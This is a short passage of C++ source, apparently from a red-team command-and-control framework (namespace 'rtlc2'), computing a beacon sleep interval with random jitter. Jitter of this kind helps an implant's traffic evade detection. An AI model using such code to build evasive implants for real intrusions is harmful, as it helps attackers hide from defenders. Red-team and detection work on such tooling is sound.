    if (config_.jitter <= 0) return config_.sleep_interval;

    int jitter_range = config_.sleep_interval * config_.jitter / 100;
    // Random offset within jitter range
    int offset = (std::rand() % (2 * jitter_range + 1)) - jitter_range;
    int sleep = config_.sleep_interval + offset;
    return sleep > 0 ? sleep : 1;
}

} // namespace rtlc2
